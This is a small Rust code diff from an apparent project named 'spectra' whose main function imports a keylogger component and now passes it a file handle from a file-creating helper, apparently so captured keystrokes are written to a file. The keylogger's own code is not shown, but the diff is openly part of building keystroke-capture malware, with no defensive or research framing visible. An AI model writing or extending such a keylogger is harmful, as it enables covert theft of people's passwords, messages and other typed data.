@@ -1,5 +1,6 @@
-use spectra::components::keylogger;
+use spectra::components::{keylogger,filecreator};
 
 fn main() {
-    keylogger::activate_keylogger();
+    let file = filecreator::filehandler().unwrap();
+    keylogger::activate_keylogger(file);
 }
